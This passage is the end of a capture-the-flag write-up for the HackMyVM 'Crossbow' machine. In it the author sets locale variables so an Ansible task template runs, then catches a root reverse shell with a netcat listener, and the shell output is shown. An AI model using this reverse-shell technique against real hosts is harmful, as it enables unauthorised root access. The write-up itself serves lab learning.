```

An error occurred `Ansible could not initialize the preferred locale: unsupported locale setting`. This error made me go crazy for a while.... But we can work around this issue now.

In the environment we cat configure the locales as well. So we should navigate back to the environment and adjust the environment configuration.
```
{
	"LC_ALL":"en_US.UTF-8",
	"LANG":"en_US.UTF-8"
}
```

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224112512.png){: width="700" height="400" }

We should save the new configuration and navigate again to `Task Template` and run the task again.

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224112618.png){: width="700" height="400" }

This time we did not get an error, but we did get a reverse shell back!
Now we can capture the flag on Crossbow!

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
connect to [10.0.2.5] from crossbow.hmv [10.0.2.9] 51134
bash: impossible de régler le groupe de processus du terminal (577): Ioctl() inapproprié pour un périphérique
bash: pas de contrôle de tâche dans ce shell
root@crossbow:/root# ls
ls
clean.yml
config.json
root.txt
root@crossbow:/root# cat root.txt
cat root.txt
HERE IS THE ROOT FLAG
root@crossbow:/root# hostname
hostname
crossbow.hmv
root@crossbow:/root# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:ee:a1:18 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.8/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 568sec preferred_lft 568sec
    inet6 fe80::a00:27ff:feee:a118/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:9f:bf:2c:be brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:9fff:febf:2cbe/64 scope link 
       valid_lft forever preferred_lft forever
5: vethcdb8080@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 6a:13:ab:da:82:09 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::6813:abff:feda:8209/64 scope link 
       valid_lft forever preferred_lft forever
root@crossbow:/root# 


```

This was an awesome machine from cromiphi. Thank you for let me learn some awesome stuff!
